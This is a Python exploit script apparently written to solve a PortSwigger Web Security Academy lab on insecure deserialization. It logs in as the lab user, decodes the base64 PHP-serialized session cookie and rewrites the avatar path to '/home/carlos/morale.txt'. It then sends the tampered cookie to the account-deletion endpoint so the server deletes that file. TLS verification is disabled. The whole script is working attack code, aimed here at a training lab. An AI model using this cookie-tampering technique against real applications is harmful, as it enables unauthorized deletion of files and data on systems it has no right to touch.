import base64
import http.client
import re
import ssl
import urllib.parse

LAB_ID = "???"


def POST_login(
        username: str,
        password: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/login',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    fields = {
        'username': username,
        'password': password,
    }
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def login_session(
        username: str,
        password: str,
):
    response = POST_login(
        username=username,
        password=password,
    )
    cookie_header = response.getheader('set-cookie')
    return re.findall(r'session=([a-zA-Z0-9\\.%]+);', cookie_header)[0]


def POST_myaccount_delete(
        session: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/my-account/delete'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'dnt': '1',
        'sec-gpc': '1',
        'referer': f'https://{LAB_ID}.web-security-academy.net/my-account?id=wiener',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'priority': 'u=1',
        'te': 'trailers',
    }
    fields = [
    ]
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


username = 'wiener'
password = 'peter'
file_to_remove = f"/home/carlos/morale.txt"

session = login_session(
    username=username,
    password=password,
)
print(f"got session: {session}")
decoded_session = base64.b64decode(urllib.parse.unquote(session)).decode('utf-8')
print(f"decoded session: {decoded_session}")

new_session = decoded_session.replace(f's:19:"users/{username}/avatar"', f's:{len(file_to_remove)}:"{file_to_remove}"')

print(f"new session: {new_session}")
new_session_encoded = urllib.parse.quote(base64.b64encode(new_session.encode('utf-8')).decode('utf-8'))
print(f"new session encoded: {new_session_encoded}")

response = POST_myaccount_delete(new_session_encoded)
print(response.status)
for name, header in response.headers.items():
    print(f"{name}: {header}")
print(response.read().decode())
